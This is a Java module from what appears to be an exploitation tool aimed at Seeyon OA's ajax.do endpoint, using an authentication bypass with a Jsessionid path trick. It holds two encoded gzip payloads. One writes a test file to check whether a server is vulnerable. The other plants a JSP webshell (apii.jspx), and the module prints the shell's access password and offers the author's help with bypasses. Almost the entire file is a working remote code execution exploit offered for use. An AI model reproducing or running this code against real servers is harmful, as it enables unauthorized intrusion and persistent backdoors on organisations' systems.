package exp.oa.seeyonoa;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class seeyonoa_ajaxBypass implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url, TextArea textArea) {
        String payload = "%1F%C2%8B%08%00%00%00%00%00%00%C3%BFtQMo%C2%A30%14%3Co~%C3%85%13%17%1B-%C3%ABh%C3%99%C3%ACjU%C2%94C%C2%A3%7CH%C2%95%C2%A0%1F%09%C2%8A%C2%94%C2%AA%07%0A%C2%8F%C3%A2%16%1Bd%C2%9B%C2%86%24%C3%8A%7F%C2%AF%084%C2%89%C3%94%C3%94%C2%97%C3%B1%C2%8C%C3%A7%C2%8D%C3%86v%C3%AFqG%C3%92B%C2%89%2A%C2%8F%16%C2%9B%12%C3%89%15%C3%BCv%C3%A0S%09%22%C3%91%28%C3%84%C2%A06%C3%A4%24O%C3%AAR%C2%A1%C3%96%C2%BC%C2%90%C3%8D%C3%A1%C3%9C%28._%C2%A0%C2%8CL%06C%C2%B0%18%C3%AB%C2%AF%C3%B19%2AK%C3%9D%C3%97%C2%88%C2%9BB%C3%B6-%C2%AF%07%C3%AD%C3%BA%C3%B1%1A%C2%BDG%C2%8C%17%C3%ACNqi%C2%96%C2%8A%1BTP%C2%9E%C3%B6.%0CA%C3%A2%1A.%C3%98h%C2%93%C3%BF%C3%93%C2%92%5Cg%7C%C2%9BU%C3%8C%C3%94%C3%86%C2%B2%C2%8F%C3%81%C3%90%C2%95%C3%90%19%C3%A6y%C3%93%C3%A2v%C3%B9+%C3%BCm%C2%92%C2%AD%C2%84%C3%BF%27po%C3%9EV%C3%A3p%C3%A0%C2%8B%C3%BB%C2%BF%C3%BEl%C2%9A%C2%AF%C3%84T%04%C2%B3p%1B%2C%7D%C3%97w%C3%83%C2%A1uL%C3%91%C2%95d%C2%82%C3%AB%C2%98%C2%8D%C2%AE%C3%A7%C2%93%7F%C2%831%C3%86E%C2%82%0A%C2%92%0E%C3%9Br%C2%97M%C3%B4k%C2%99v%C2%AC%23%C3%ADlKh%17%C3%88Z%1CUi%C2%8A%C2%8A%1E%C2%BA%C3%9B%C2%8E%15.%C2%A6%C2%BF%C3%BE%C2%9F%C3%9F%C3%AD%C3%BC%C2%81%C3%98%C2%81%C3%A4%C2%92%C2%9E%C2%87%7F%C3%A7%C2%8D%C3%B3B%23%C2%B5%C2%BD%C2%BD%C3%97%7C+%C2%B5%C2%BD%04S%C3%90%262%3C%C2%86%C2%BA%C2%AE%C2%A9%C2%BD%23%7B%07%08q%60%C3%97%C2%A0Q%15%C2%92%C2%A7%C3%9EG%00%00%00%C3%BF%C3%BF%C3%81%C2%86%C3%BD%C3%82%12%02%00%00";
        HttpTools.get(url + "/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&managerMethod=validate&managerName=formulaManager&requestCompress=gzip&S=ajaxColManager&M=colDelLock&arguments=" + payload, new HashMap<String, String>(), "utf-8");
        Response response1 = HttpTools.get(url + "/seeyon/nishizhu.txt", new HashMap<String, String>(), "utf-8");
        if (response1.getCode() == 200 && response1.getText().contains(shell.test_payload)) {
            Platform.runLater(() -> {
                textArea.appendText("\n 漏洞存在 测试文件写入成功\n" + url + "/seeyon/nishizhu.txt");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n seeyonoa_ajaxBypass-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        String payload = "%1F%C2%8B%08%00%00%00%00%00%00%C3%BF%C2%A4V%5B%C2%93%C2%A2J%12~%C3%9E%C3%B9%15F%C2%BFtw%C3%8C%C2%AC%C2%83%28g%C3%86%C2%9D8%0F%C2%82Z%16%28%C2%AD%C3%90%14%C2%97%C2%8D%7D%C2%A0%C2%AAhn%C3%85e%04T%C2%9C8%C3%BF%7D%C2%A3DlwO%C3%AF%C3%8B%1E%23%0C%C2%A8%24%2B%C3%B3%C3%8B%C3%8C%2F%C2%B3%C3%AA%C3%93%3F%7F%3D%C2%BE%15%C3%BB%C2%ACa%C3%BEk%5B%06%C2%8F%C3%BF%18%C2%8C%C2%BE%0Cz%C2%89%C3%AEg%5C%C3%B2X%07U%C3%BD%C3%B8.%5E%C2%9C%C3%8A%7DPUq%C2%91%C3%B3%C2%8Ff%C2%BD%C2%8F%C3%B3pP%C3%BAu4%C3%B8%7D%C3%B00%1C~%3D%06%C3%98%2F%C3%8B%C3%AAk%15%04m%C2%91%7F%7D%C3%B8%C3%B1i%C3%90%C3%BD%C3%BE%C2%96%C3%B8%07%7F%18%17%C3%83%C3%AD%3E%C3%8Ek%7B%1F%C3%97%C3%81~P%C2%BE%C2%BF%C2%8B%C2%83%C3%9F%07yp%1C%7C%C2%A0%C3%B6%C3%84%C3%AD%7F~%C3%B0%C3%8B8%1E%26Uyzx%C2%BEY%1D%5C%11TQ%C3%80%18%C2%87%C2%B0%05%C3%A5%C2%99%C3%8C%C3%8B%16%C2%8BS%01%C2%AE%C2%A2%1A%03%C3%A9%C3%BC%C2%92q%C2%99%10%C3%BB%2BC+%C3%B3%C3%A2%C2%B0%16%C3%8B%C2%88f%C2%8B%C2%86%C2%8CQ%C2%B3%C3%8E%C3%B4%036%C2%A7%C2%9A5%C2%9A%1D%2C%C2%B0%C3%8C%3D%13%C2%864C-%11%C3%99%01%27B%C2%BC1%27-L%26%C3%9F%C3%BD%5C%3F%C2%BEdFI2%C2%94P%C3%80D%C3%8F%C2%94%C2%8E%C2%AEM%19%04%C2%AC%26%60%C3%9ARn%3F%5B%C2%8A%C2%AE%29%C2%8D%28%60%C3%95%3A.%C2%AA%C3%AB%C2%BA%C3%84%C3%AD%C3%A4%C3%A7%1Ap%C2%9F%C3%8B%C3%89%3A%C3%93%C3%9B%C3%80%C2%91%C2%85%C2%8Fe%C3%92%C2%99%00%C2%94%C3%9C%C3%AD%C2%AD%5C%5B%C3%8A%C3%97q%11%C2%AF%C3%8F%13%5DIN%3F%C3%89x%C3%B6%C2%9B%07P%C2%82%C3%81%C2%B2u%1D%C2%A3%C3%84%C3%A2%C3%A4%C3%B3%7CW%C3%B2%C3%B5%C2%99%C2%B42%C2%82%00M%28%40%C2%8D%C2%B7%C3%9A%C2%84%3B%C3%B1%14%C2%91%C2%B1%C2%BE%C3%81%C3%A22%C3%B5%1C%18%06GAS%C2%90U%C3%BC%C2%B7%C3%9Cm%C3%93%C3%AE%C3%9B%C2%8E%C2%9D%C2%A9%233%12G%C2%89%C3%B6Z%C3%A9J%C3%88%C2%A6%C3%B3%5D%C2%A1%C2%92%15%C2%8A1%60%09%5C%C3%A8%C2%95%C3%AB%C3%A8g%08H%C3%A1%C3%A6L%C3%B0PM%21%C2%80%25%5Cq%C3%9DT%25%19%12%C2%A8%C2%A36p%C2%A5%C2%8F%08%40%C3%AD%3A3%C2%98%C2%97%C2%B1%C3%86%C2%B3%C2%BA%7D%1A%C2%80%15%C2%9C%C3%8F%2A%08%60%C2%839%C3%86%C2%B1Q%C2%BC%C3%BB%29%C2%B9%C2%AF%C3%AFk%C3%B1R%C2%BF%C3%94%C2%B3%C3%B9%1E5%C2%A2%C2%80%C3%97%C3%A1%3Dv%22%C3%AA%C2%AD%C3%8Fs%05%C2%90%C2%B0%0D%05%C2%8D%C2%AET%C3%A9%C2%8A%C3%BD%C2%95%C2%AE%C3%94%12g%24%C3%B4E%24mM%28m%C3%A6r%C3%AC%C2%9E%C3%83%C2%89n%C3%AF%C3%86%C3%BA%C2%ABu%C3%9E%C2%9C%C3%89%08%267%C2%AC%27j%C2%A33U%C2%A4%C2%B3%C3%A7%182%5D%19%C2%ADo%C2%AB%23%0A%C2%AC%02%C3%A6%C3%BA%3E0a%05A%C3%8D%023%C3%BD%C3%86s%C2%A0+%5D+%3C%C2%96VN%5D%C3%87%C2%88%C2%B6%C2%8E%C3%8A%C2%88%C2%83%18%19%C3%AF%1AOD%C2%82%C2%95%C2%A1%C3%88%03%C2%A8%C3%95%C2%94%C2%B4%21%C3%BC%7Dq%2Aqf%5D%C3%A3KU%C3%9FvC%0D%18%11%05%C2%8Bhk%C3%8A%0D%C2%B5O%C2%95f%C3%8A%C2%9D%C3%AD%3B%C3%AC%C2%9C%7Bp.%C2%84%C3%96%C2%98%C2%9D%29%40%C3%B5%3A%C2%A3%C2%8C.%C3%A5%16%C2%8FeFrC%C3%92%14%C3%B5%C2%A7%C3%ABx%C3%91%3A%C3%B7%18%C3%89u%5E%C3%BF%C2%B8%C3%B7%C2%A1%C3%98%C2%AAD%01%C3%82%C2%8E%29%27X4%C3%98%C3%96%C2%96F%18%1C%2F%3E%C2%A02%0B%C2%BB%C2%BF%5Cz%C3%B1%C2%AC%C3%A0~.%C3%9Cw%C3%A4%C2%88d%C3%88%C3%82m%C3%88%C2%B9%3E%C2%81q%1An%13%21%C3%9C%28WN%C2%98%C3%BD%C2%BE%C3%AB%C2%BF%C3%A7%C3%80B%C2%8D%C2%88h%C2%89%C2%BA2%C2%9B%C3%B6%C2%B2u%C3%A6%1DH%2AE%C3%98%C2%B6%0A%C2%98u%3DF9G%15Iq%1D%C2%9D%C3%A9%C3%89%C2%AE%C3%87%C3%BA%C2%9F6%15y%C3%ABf%25s%C3%87%C2%BB%C3%90%C3%A0%C3%9C%16%0DFbn%C2%B7%C3%B7%21%C3%A5%C2%9Ec%C3%A8%C2%9Ec%14X%C3%9C%15%C2%90%C3%A7da0W%C2%9Cr%C3%BE%C3%86ke%C3%96s%1A%3Bf%1A%C3%A2%1CUXI%1B%C3%9F%C2%96D%2C%C3%96L%C2%BB%C3%999%C2%86%C3%9Ab%1A%C3%BB%C2%BC%C2%87%C2%975%C3%95%C3%BA%3A%7C%C2%8C%C3%A9%C2%82%C2%83%C3%97B%03%7D%5E%C3%93%3B%7C%17L%C3%B3%C2%AE%C3%AF%C3%82%C3%B2R%C2%A7%C3%85%C2%88Q%10%1D%3C%25%C2%8C%C2%BD%C2%AB%1E%C2%8C%C2%8F%21%C3%8E%C3%90%C2%B8%C3%8F%C2%91%3D%1A%7D%C3%AB%7Bg%C2%9Du%C2%B27%C3%B3%1E%C3%AB-%C2%AE%0A%02%C2%89%C3%91%C2%B6%C3%8F%C2%8D%C2%81%1D%C2%A7%C2%BEp%C2%AF%C3%B3u%C3%81t%C3%96%14%15%C2%A1%C2%85%5B%C2%BF%28%C2%B0%7C%C2%BBr%C3%B5.%C2%86%29%04%C2%A8%22%C2%A2%C3%B5%C3%97j%C2%99%C3%AB%23%1CK%C2%B5%C3%AF%C3%A8%C3%89%3AUeK%C2%B0D%C3%BD.%C3%BF%C3%BFgM%1B%C3%8F%C2%A1%2A%C3%8Eu%C3%81%C2%B5%C2%A5%C3%843%C3%83%C3%B2%C3%A5%23%C2%8C%40%3Fx%C3%80%0A%C2%B7%C3%A6%C3%AC6s4S%5Ex6%C2%97s%0E%C3%B3%5C%5C%C3%A7%C2%8B%C2%92%5Ez%C3%B1%C3%95F%C2%82%0F%C2%A6%C2%A9%C2%A6%C2%A8%C3%A9UO%C2%A1%C2%B6%C2%97u%5C%C2%91%1B%C3%8F%21%C3%A1%C2%8D%2FN%C3%9D%C3%B7%5E%C3%A3v%C2%B2%C2%A9%C3%86gv%C3%AE%1D%7C%C3%91%2A%C3%9E%C2%B1%C3%B7u%7C%C3%A7O+%C3%B2~%5EN%C3%BF%14%C3%BFJ%C3%A8%C3%BA%C3%91%C3%92K%02%22Fb9%C3%A1%3C%C3%9A%C2%89%C3%AC%C3%A8%C3%9F0%C2%B3%C2%86%C2%8C%C2%8D%08g%3A%C3%93%14U6%C3%90%C3%A6%C2%AE%C2%8F7%C2%9C%0F%25U%C3%82%C2%B6%C3%87k%C2%89%28%C3%A1%C3%B3%C3%95%14%C2%91d%C2%8De%C3%A6%C2%B6%C3%91%C3%9Es%C2%BAxw%3C%2F%C3%8E%C2%A6%C3%90%C3%8Cc%08%C3%93%C3%A5%C3%92ja%C3%B9n%C3%AB%C3%82%21%C2%A4%C2%AD%C2%8C%C3%82w6%C2%9D%C3%BE%25N%C2%AE%7F%C3%87a%C3%A1tpm%1EgXr%C2%B9%066%C2%8D%07%C2%A6%C3%80%C2%B7%C2%A5%08%2B%C3%91%25%07%C2%9A%C2%996%3C%07%C2%A6-%C2%9D%29X6%C2%AEhq%1B%7C%0EFx%C2%B5%29%08%3F%3F-%C3%BD%C2%80s%C2%83%05%C2%AB%5DW%C3%8F%5Dw%C2%86%C2%BC%C3%99zD%C2%81%5Eh%0B4qEt%C2%BC%C3%8C%C3%B5Xf%C2%9AS%C3%A9J.%7C%C2%BB%C2%9B%C3%BDgw%C2%AC%C2%96deT%C2%9E%C2%B3%C3%BB%7C%27%C2%BF%C2%9C%C3%A9%7C%C3%A6%3F%C3%9CN%C3%BF%C2%AA%C3%89%C2%87Y%5C%C2%91%C2%A1%3C3%17%C2%BFM%C3%A6%01%29h%C2%B0%1F%C3%90%C3%AB%C2%B3%C2%BBQ%7C%C2%AC%C3%B4%C3%B4%C3%A7KD%C2%B7%C3%AD%C2%BA%C3%A8%C3%B6v%C2%8B%C2%A7%C2%AB%C3%81a%C3%B7%C2%94%C2%9B%C2%B7%C2%B7%60%C3%BFt%C2%B9s%3C%7Fy%C2%B0%5E%C2%97%7F%C3%BF~%7F%27%C2%B9%C2%BF%C3%95%0C%2F%0B%C2%96%3F%C3%9D%1B%C3%BF_%C2%BA%C2%84%15U%C3%B0%C3%B4%C3%BC%C3%A3%C2%8F%1F%C3%BC%C3%96%C3%B5%C3%B4%C3%BC%C2%83%06o%C2%83%C2%AA%C3%B6%C3%AB%C2%98%0CN%C2%A7%C3%93%C3%93%C3%B3%C2%AF%C3%87%3F%C2%BE%0C%1E%1F%C2%BF%0C~%C3%B1g%C2%BDo%C2%82%C3%87%7F%7D%C3%BAw%00%00%00%C3%BF%C3%BF%0AB%C2%81%C3%97%C3%87%09%00%00";
        HttpTools.get(url + "/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&managerMethod=validate&managerName=formulaManager&requestCompress=gzip&S=ajaxColManager&M=colDelLock&arguments=" + payload, new HashMap<String, String>(), "utf-8");
        Response response1 = HttpTools.get(url + "/seeyon/apii.jspx", new HashMap<String, String>(), "utf-8");
        if (response1.getCode() == 200 && response1.getText().equals("")) {
            Platform.runLater(() -> {
                textArea.appendText("\n 漏洞存在 webshell文件写入成功\n" + url + "/seeyon/apii.jspx");
                textArea.appendText("\n 天蝎webshell管理工具 密码sky");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell写入失败 请自行加密 或微信联系作者绕过");
            });
            return false;
        }
    }

}
